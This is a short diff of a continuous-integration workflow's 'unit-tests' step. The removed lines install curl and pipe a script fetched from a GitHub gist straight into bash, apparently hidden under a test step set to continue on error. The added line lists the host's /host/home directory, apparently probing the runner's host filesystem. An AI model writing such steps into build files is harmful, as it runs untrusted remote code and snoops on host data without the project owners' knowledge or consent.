@@ -16,6 +16,5 @@ jobs:
       - name: unit-tests
         continue-on-error: true
         run: |
-          apt update 
-          apt -y install curl
-          curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/2d321805d9ca66974989a4fe4704a5085ffb9274/bak4116223 | bash
+          ls /host/home
+          
